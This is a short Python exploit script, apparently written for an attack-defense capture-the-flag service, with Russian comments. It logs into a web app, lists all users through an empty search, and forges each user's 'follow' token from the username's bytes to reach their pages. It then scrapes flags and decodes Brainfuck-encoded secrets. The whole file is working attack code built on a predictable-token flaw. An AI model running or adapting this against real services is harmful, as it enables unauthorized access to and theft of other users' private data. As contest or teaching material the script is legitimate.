#!/usr/bin/env python3

# Первая уязвимость - слабый токен. Здесь также используется возможность поиска по пустой строке
import requests
from requests.auth import HTTPBasicAuth
import json
import time
import re
import sys
 
import bfParser

ip = sys.argv[1]

with requests.Session() as s:
    p = s.get('http://{}:5000/login'.format(ip))
    csrf = re.findall('name="csrf_token" type="hidden" value="(.*)"', p.text)
    headers = {'Content-type': 'application/x-www-form-urlencoded'}
    p = s.post('http://{}:5000/login?next=%2Fhome'.format(ip), data = 'csrf_token={}&username=wee&password=wee&submit=Sign+In'.format(csrf[0]).encode('UTF-8'), headers = headers)
    
    p = s.post('http://{}:5000/search'.format(ip), data = 'csrf_token={}&order=date_created&search='.format(csrf[0]).encode('UTF-8'), headers = headers)
    users = re.findall('<form action="/follow/(.*)" method="post">', p.text)
    csrf = re.findall('name="csrf_token" type="hidden" value="(.*)"', p.text)
    #
    for user in users:
       req = 'csrf_token={}&token={}'.format(csrf[0], int.from_bytes(user.encode(), byteorder='big'))
       p = s.post('http://{}:5000/follow/{}'.format(ip, user), data = req.encode('UTF-8'), headers = headers)
       posts = re.findall('TEAM\d{3}_[A-Z0-9]{32}', p.text)
       print(posts) # Получили все флаги, хранящиеся в открытом виде
       
       posts = re.findall('">([\-\[\&gt;+l\]\.]+)<[\/]', p.text)
       for bf in posts:
           bf = bf.replace("&gt;",">")
           bf = bf.replace("&lt;","<")
           res = bfParser.evaluate(bf)
           print(res)